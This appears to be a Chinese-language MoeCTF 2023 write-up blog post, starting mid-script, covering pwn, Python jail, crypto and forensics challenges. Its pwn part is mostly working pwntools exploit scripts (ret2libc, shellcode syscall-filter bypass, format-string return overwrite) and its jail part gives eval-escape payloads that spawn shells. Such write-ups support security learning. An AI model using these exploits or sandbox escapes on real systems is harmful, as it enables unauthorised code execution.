libc.dump('puts')success(f&quot;libc_base -&gt; {hex(libc_base)}&quot;)ret = 0x000000000040101a # system = libc_base + libc.sym['system']# binsh = libc_base + next(libc.search(b'/bin/sh'))system = libc_base + libc.dump('system')binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = flat([ b'a' * (0x50 - 8),leak_canary,b'a' * 8, ret,rdi,binsh,system])sa(&quot;What's your name?\\n&quot;,payload)sa(b&quot;I put a canary on my stack!\\n&quot;,payload)p.interactive() rePWNse[补]题目中有给 设置好的execve的模板，有pop rdi ret的gadget，但是没有binsh字符串，需要在makebinsh中构造一个binsh字符串。 这个makebinsh函数第一眼看觉得挺复杂的，但是细看会发现就是一个一元一次方程的约束求解，其中有一些 strncat((char *)s, &amp;src[v7[1]], 1uLL); 通过v7[i] 来做下标的表达式，是可以直接看出v7[i]的值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172__int64 makebinsh(){ unsigned int v0; // eax int v1; // eax int v2; // eax int v3; // eax int v4; // eax int v5; // eax int v7[8]; // [rsp+0h] [rbp-70h] BYREF char src[64]; // [rsp+20h] [rbp-50h] BYREF void *s; // [rsp+60h] [rbp-10h] int i; // [rsp+6Ch] [rbp-4h] strcpy(src, &quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;); s = malloc(8uLL); memset(s, 0, 8uLL); v0 = time(0LL); srand(v0); puts(&quot;Input seven single digits:&quot;); for ( i = 0; i &lt;= 6; ++i ) __isoc99_scanf(&quot;%d&quot;, &amp;v7[i]); if ( v7[3] * v7[1] == 10 * v7[4] + v7[5] ) { strncat((char *)s, src, 1uLL); } else { v1 = rand(); strncat((char *)s, &amp;src[(int)(53.0 * ((double)v1 / 2147483647.0))], 1uLL); } if ( v7[5] == v7[6] + 1 ) { strncat((char *)s, &amp;src[2], 1uLL); } else { v2 = rand(); strncat((char *)s, &amp;src[(int)(53.0 * ((double)v2 / 2147483647.0))], 1uLL); } strncat((char *)s, &amp;src[v7[1]], 1uLL); if ( v7[1] == v7[3] ) { strncat((char *)s, &amp;src[14], 1uLL); } else { v3 = rand(); strncat((char *)s, &amp;src[(int)(53.0 * ((double)v3 / 2147483647.0))], 1uLL); } strncat((char *)s, &amp;src[v7[6]], 1uLL); if ( v7[0] == v7[2] ) { strncat((char *)s, &amp;src[19], 1uLL); } else { v4 = rand(); strncat((char *)s, &amp;src[(int)(53.0 * ((double)v4 / 2147483647.0))], 1uLL); } if ( v7[3] - v7[4] == v7[0] ) { strncat((char *)s, &amp;src[8], 1uLL); } else { v5 = rand(); strncat((char *)s, &amp;src[(int)(53.0 * ((double)v5 / 2147483647.0))], 1uLL); } printf(&quot;Here's the string:%s\\n&quot;, (const char *)s); printf(&quot;The address is:%p\\n&quot;, s); return 0LL;} 大约是这些约束，算了一下 得出的v7[]的结果是 1919810 123456789101112131415161718192021222324252627str = &quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;result = &quot;&quot;# v7[3] * v7[1] == 10 * v7[4] + v7[5]result += str[0]# v7[5] == v7[6] + 1result += str[2]# strncat((char *)s, &amp;src[v7[1]], 1uLL); v7[1] == 9# print(str.find('i'))result += str[str.find('i')]# v7[1] == v7[3] v7[3] == 9result += str[14]# strncat((char *)s, &amp;src[v7[6]], 1uLL); v7[6] == 0result += str[0]# v7[0] == v7[2]result += str[19]# v7[3] - v7[4] == v7[0]result += str[8]print(result) exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./rePWNse')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;192.168.1.102&quot; port = 49704 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])ru(&quot;Input seven single digits:\\n&quot;)v7 = [None] * 7v7[0] = 1v7[1] = 9v7[2] = 1v7[3] = 9v7[4] = 8v7[5] = 1v7[6] = 0for i in range(7): sl(str(v7[i]).encode())ru(&quot;The address is:&quot;)binsh = int(rl()[:-1],16)success(hex(binsh))rdi = 0x000000000040168eexecve = 0x40129Bpayload = flat([ b'a' * (0x40 + 0x8), rdi,binsh,execve])s(payload)p.interactive() shellcode_level3[补]gets(code) 输入的位置，只有前五个字节有可执行的权限，有一个backdoor function，jmp 过去就好了， jmp的字节码是e9，相对寻址(rip) 后面跟的是一个偏移地址，算一下code的地址到backdoor的偏移是多少，转换成补码就好了，注意一下端序是小端序 123456789int __cdecl main(int argc, const char **argv, const char **envp){ puts(&quot;5 bytes ni neng miao sha wo?&quot;); mprotect(&amp;GLOBAL_OFFSET_TABLE_, 0x1000uLL, 7); gets(&amp;code); memset(&amp;unk_40408E, 0, 0xF72uLL); ((void (*)(void))code)(); return 0;} 1234int givemeshell(){ return system(&quot;/bin/sh&quot;);} 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./shellcode_level3')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;192.168.94.193&quot; port = 57295 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])# 40408E - 4011D6 = 11960 # -11960的补码是 48d1ffff, 小端序shellcode = b&quot;\\xe9\\x48\\xd1\\xff\\xff&quot;sl(shellcode)p.interactive() changeable_shellcode [补]有一个filter函数，把syscall给过滤了，那能不能在shellcode中，造一个syscall出来？ 123456789101112131415void __cdecl filter(char *buf, int len){ int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; i &lt; len - 1; ++i ) { if ( buf[i] == 15 &amp;&amp; buf[i + 1] == 5 ) { puts(&quot;Is that 'syscall'?&quot;); buf[i] = 0; buf[i + 1] = 0; puts(&quot;Oh, nothing.&quot;); } }} b’\\x0f\\x00’，把\\x00修改成 05就是syscall的字节码了，这个偏移可以通过字符串长度来算，因为00是在结尾的 len -1 就是偏移了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *from LibcSearcher import *context(os='linux',arch='amd64',log_level='debug')elf = context.binary = ELF('./shellcode')libc = elf.libcis_debug = 1if(is_debug): p = process()else: ip = &quot;192.168.94.193&quot; port = 54025 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])ru(&quot;Please input your shellcode: \\n&quot;)shellcode1 = asm('''mov rax,0x68732f6e69622fpush raxpush rsppop rdixor esi,esixor edx,edxpush 0x3bpop rax''')shellcode1 += b'\\x0f\\x00'print(len(shellcode1))print(shellcode1[21])shellcode2 = asm( &quot;&quot;&quot; mov al, 0x05 mov [0x114514020], al &quot;&quot;&quot;)payload = shellcode2 + shellcode1print(len(payload))print(payload[len(payload) - 1])# g(p)s(payload)p.interactive() format_level2[补]got表不可改，有一个cat flag的backdoor函数，先用格式化字符串泄露一个栈相关的地址，利用偏移算出main的返回地址，然后把main的返回地址的低位修改成backdoor的低位，这样就能jmp到backdoor上了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')elf = context.binary = ELF('./format_level2')libc = elf.libcis_debug = 0if(is_debug): p = process()else: ip = &quot;192.168.94.193&quot; port = 51366 p = remote(ip,port)# gdb.attach(p)g = lambda x: gdb.attach(x)# send() sendline() sendafter() sendlineafter()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x,y: p.sendafter(x,y)sla = lambda x,y: p.sendlineafter(x,y)# recv() recvline() recvuntil()r = lambda x: p.recv(x)rl = lambda : p.recvline()ru = lambda x: p.recvuntil(x)r_leek_libc_64 = lambda : u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))r_leek_libc_32 = lambda : u32(p.recvuntil(b'\\xf7')[-4:])sl(&quot;3&quot;)s(&quot;%p&quot;)ru(&quot;You said: \\n&quot;)leak_addr = int(ru('But')[:-3], 16)ret_addr = leak_addr + 64success(hex(ret_addr))# 08049317payload = b&quot;%23p%10$hhn&quot;.ljust(12, b'a') + p32(ret_addr)sl(&quot;3&quot;)s(payload)payload = b&quot;%147p%10$hhn&quot;.ljust(12, b'a') + p32(ret_addr + 1)sl(&quot;3&quot;)s(payload)sl(&quot;4&quot;)p.interactive() CRYPTOCrypto 入门指北去查询了一下指北里面的信息 欧拉函数 的定义是小于等于n和n互质数的个数，n是质数的时候则为n-1 然后 ax mod b = 1的时候，x则称作a mod b的逆元，是a的倒数 所以d = pow(e, -1, phi)这个是这么来的 得到私钥后就直接解密拿到flag 1234567891011from Crypto.Util.number import * # 一个非常好用的crypto库p = 0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7q = 0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044ebc = 0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296e = 65537n = p*qphi = (p-1) * (q-1) # 你知道什么是 欧拉函数吗 [1]d = pow(e, -1, phi) # 什么是乘法逆元？ [2]m = pow(c,d,n)print(long_to_bytes(m)) baby_eJailjail挺好玩的，思路开阔了很多 参考的这个文章学习的https://zhuanlan.zhihu.com/p/578966149 Jail lavel 01234print(&quot;Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)user_input_data = input(&quot;&gt; &quot;)print('calc Answer: {}'.format(eval(user_input_data))) 可以用__ import __来导入os模块使用system来执行系统命令,import魔术方法使用import导入模块的时候，会调用import魔术方法。import魔术方法可以用来动调加载模块 1__import__('os').system('sh') flag{0dAAkA3NNdFaoIDhHrqY35M60amn3_Cs} Jail lavel 1这里多了个长度限制，lv0的payload用不了 1234567print(&quot;Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)user_input_data = input(&quot;&gt; &quot;)if len(user_input_data)&gt;12: print(&quot;Oh hacker! Bye~&quot;) exit(0)print('calc Answer: {}'.format(eval(user_input_data))) 网上搜到有个思路是二次传参，exec(input())但是超了一个字符 有个breakpoint()函数，可以打开一个叫pdb(python debugger)的调试器，这个调试器可以执行python代码，还有打断点调试代码 进入后用第一题的__ import __ (‘os’).system(‘sh’)就能打开一个终端，然后 cat flag拿到flag flag{Wk1Sp0Q4gA6at3kySUmJhtdZq_AitxwJ} Jail lavel 2这里加了个长度限制 1234567print(&quot;Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)user_input_data = input(&quot;&gt; &quot;)if len(user_input_data)&gt;6: print(&quot;Oh hacker! Bye~&quot;) exit(0)print('calc Answer: {}'.format(eval(user_input_data))) 可以使用help()函数 查看sys模块，sys模块下有个: 可以传递参数过去当shell命令执行 1234help()sys!cat flag flag{iQR2CFeLlJ8Hi8ydPGs-HVHXSmGiQxwP} Jail Level 3 [未解决]长度不超过12 且不可用breakpoint ,hint中help被禁用 12345678910111213import reBANLIST = ['breakpoint']BANLIST_WORDS = '|'.join(f'({WORD})' for WORD in BANLIST)print(&quot;Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)user_input_data = input(&quot;&gt; &quot;)if len(user_input_data)&gt;12: print(&quot;Oh hacker! Bye~&quot;) exit(0)if re.findall(BANLIST_WORDS, user_input_data, re.I): raise Exception('Blacklisted word detected! you are hacker!')print('Answer result: {}'.format(eval(user_input_data))) Jail Level 4是一个不断循环 的eval(input)，python2.7环境的 1__import__('os').system('sh') 拿到flag flag{MvhG6P0cpa4yavJzq6gcJAYgGfNSi5yZ} Leak Leval 0123456789101112131415161718fake_key_into_local_but_valid_key_into_remote = &quot;moectfisbestctfhopeyoulikethat&quot;print(&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;)print(&quot;| Options: | [V] uln | [B] ackdoor &quot;) def func_filter(s): not_allowed = set('vvvveeee') return any(c in not_allowed for c in s) while (1): challenge_choice = input(&quot;&gt;&gt;&gt; &quot;).lower().strip() if challenge_choice == 'v': code = input(&quot;code &gt;&gt; &quot;) if (len(code) &gt; 9): print(&quot;you're hacker!&quot;) exit(0) if func_filter(code): print(&quot;Oh hacker! byte~&quot;) exit(0) print(eval(code)) elif challenge_choice == 'b': print(&quot;Please enter the admin key&quot;) key = input(&quot;key &gt;&gt; &quot;) if (key == fake_key_into_local_but_valid_key_into_remote): print(&quot;Hey Admin,please input your code:&quot;) code = input(&quot;backdoor &gt;&gt; &quot;) print(eval(code)) else : print(&quot;You should select valid choice!&quot;) vuln 9的长度可以用globals() 将真正的key给找出来，然后用backdoor执行代码 1234globals() #找到了key 'key_6366a131649a4e9b': '4e86eda06366a131649a4e9be1a9f217'4e86eda06366a131649a4e9be1a9f217__import__('os').system('sh')cat flag 1flag{GjyJBWFLfQoLO8qiZpIMjKQEjl-MBKnq} Classical Cryptoezrot1@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F}%0N 查询了一下rot编码的原理，原理是将字符的ascii往前推 https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php 使用这里的rot47拿到flag，少了个m需要补充一下 1moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_} 可可的新围墙搜索围墙这个词，搜到了栅栏密码 1mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp}e{ciri_hT_avn3Fa_j http://www.atoolbox.net/Tool.php?Id=777 在线解密 1moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj} 皇帝的新密码观察长度，字符结构，像是将每个字符的ascii偏移n位，搜索到了凯撒密码 1tvljam{JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av} https://www.lddgo.net/encrypt/caesar-cipher 偏移7 1moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To} 不是“皇帝的新密码”这个题好坑啊，这里这个md5是key的md5，不是flag的md5，但是上面写着md5 of flag，我解了半天出不来，想来想去也不是代码逻辑有问题，弄了几组数据进去，脚本都没有问题。 密文看起来像是每位都偏移了n位，明文前六位是moectf，然后跑了一下脚本发现每位偏移都不太一样，也没有什么规律。后面发现是维吉尼亚密码 123scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}md5 of flag (utf-8) `ea23f80270bdd96b5fcd213cae68eea5` 网上查询到，维吉尼亚密码首先要确定key的长度，算出来是7，然后前六位moectf算出前六位key，爆破第七位和md5比较拿到key解密flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import hashlibdef virginiaCrack(cipherText,key): # 解密函数 length = getKeyLen(cipherText) #得到密钥长度 # key = getKey(cipherText,length) #找到密钥 for i in string.ascii_letters: key = &quot;moectf&quot; + i keyStr = '' for k in key: keyStr+=k print('the key:',keyStr) plainText = '' index = 0 for ch in cipherText: c = chr((ord(ch)-ord(key[index%length]))%26+97) plainText += c index+=1 print(plainText) return plainText# 根据明文和密文偏移关系求前面的keydef vigenere_key(plaintext, ciphertext): alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot; key = '' for p, c in zip(plaintext, ciphertext): p_idx = alphabet.index(p) c_idx = alphabet.index(c) k_idx = (c_idx - p_idx) % 26 key += alphabet[k_idx] return key#解密def vigenere_decrypt_extended(ciphertext, key): alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot; plaintext = '' key = key.lower() key_expanded = (key * (len(ciphertext) // len(key) + 1))[:len(ciphertext)] key_index = 0 for c in ciphertext: if c in alphabet: k = key_expanded[key_index] c_idx = alphabet.index(c) k_idx = alphabet.index(k) p_idx = (c_idx - k_idx) % 26 plaintext += alphabet[p_idx] key_index += 1 else: plaintext += c return plaintextdef md5_hash(text): return hashlib.md5(text.encode()).hexdigest()plaintext_prefix = &quot;moectf&quot;ciphertext_prefix = &quot;scsfct&quot;md5_target = &quot;ea23f80270bdd96b5fcd213cae68eea5&quot;ciphertext = &quot;scsfct{wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn}&quot;#前六位keykey_prefix = vigenere_key(plaintext_prefix, ciphertext_prefix)#爆破第七位keykey_candidates = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for candidate in key_candidates: test_key = key_prefix + candidate decrypted_text = vigenere_decrypt_extended(ciphertext_prefix, test_key) if md5_hash(decrypted_text) == md5_target: break#解密ciphertext_lower = ciphertext.lower()decrypted_text_full = vigenere_decrypt_extended(ciphertext_lower, test_key)decrypted_text_restored = ''.join( [decrypted_text_full[i] if c.islower() else decrypted_text_full[i].upper() for i, c in enumerate(ciphertext)])print(decrypted_text_restored) 1moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz} webaiAI入门指北在这找到不带gpu版本的安装命令 https://pytorch.org/ 1moectf{install_torch_torchvision_torchaudio} Forensics随身携带的虚拟机校园网好卡，附件下载了半天，解压后发现全是vmdk的文件 https://blog.csdn.net/jcjic/article/details/118241188 根据这篇文章创建了一个win10虚拟机然后导入vmdk进入了系统 发现有一个磁盘被bitlook锁住了，然后在回收站这发现了这个文件 12345678910111213141516BitLocker Drive Encryption recovery key To verify that this is the correct recovery key, compare the start of the following identifier with the identifier value displayed on your PC.Identifier: 4DFEE901-55AC-43EB-96F4-FFE09609952AIf the above identifier matches the one displayed by your PC, then use the following key to unlock your drive.Recovery Key: 702801-061622-323125-555819-258544-713713-089331-406373If the above identifier doesn't match the one displayed by your PC, then this isn't the right key to unlock your drive.Try another recovery key, or refer to https://go.microsoft.com/fwlink/?LinkID=260589 for additional assistance. 解锁磁盘后发现flag.txt 1bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0= base64解码获得flag 1moectf{Bas1c_D15k_F0r3ns1cs!} 坚持访问的浏览器查询资料后发现在 ~/.mozilla/firefox/…….. 下有个places.sqlite存储浏览器的历史记录和标签。 然后 moz_places表中存储网站url 标题等相关信息 在这个表中发现了https://hymint.space/~koito/ 这个网站，尝试访问一下发现打开了，没什么功能 f12找到了flag 12345&lt;!-- I am always thinking about creating a flag that is safe enough. I came up with lots of ideas and moectf{Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4} Next step is to hide it into this page!--&gt; 1moectf{Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4} 锁定起来的同人文一开始不太懂dumpmem.raw和qaq.hc 是什么文件，搜索了一下后发现一个是内存镜像，一个是用VeraCrypt加密的文件。然后找到了这个内存软件 https://github.com/volatilityfoundation/volatility3/ 1volatility_2.6_win64_standalone.exe -f dumpmem.raw --profile Win2016x64_14393 filescan | findstr /R &quot;txt png jpg gif zip rar 7z pdf doc&quot; 找到一个key 0x958246a8c550 \\Users\\Administrator\\Desktop\\key_pixiv_id105614615.png ，但是dumpfile不下来，翻了很多issue还有试过换3,也是dump不下来 一开始考虑到图片下载网站略缩图的原因，可能我根据id搜下载下来的key不正确，最后dumpfile没有思路的时候，试了一下搜索下载当key，然后解出来了 https://www.bilibili.com/read/cv3744376/ p站搜id的方法 http://www.pixiv.net/member.php?id=105614615 搜到了图片 解密了.hc文件 tmp目录下发现 history.db siyuan.db还有pandoc，搜了一下pandoc是一个文档转换的程序，siyuan是一个插件，在siyuan.db中的 block_fts_content中发现了.sy的文件名还有内容 NVXWKY3UMZ5VGMC7MQZTG4DMPFPUQMLEMRSW4IL5 这像是某种编码，根据搜索编码特征后，发现是base32 https://www.lzltool.cn/Tools/Base32Decode 解密后得到flag 1moectf{S0_d33ply_H1dden!} ww，moectf学到挺多东西的捏，入门了re和pwn，后面比较忙就没有继续做了qaq","link":"/2023/12/28/moectf-wp/"}],"tags":[{"name":"ctf writeup","slug":"ctf-writeup","link":"/tags/ctf-writeup/"}],"categories":[]}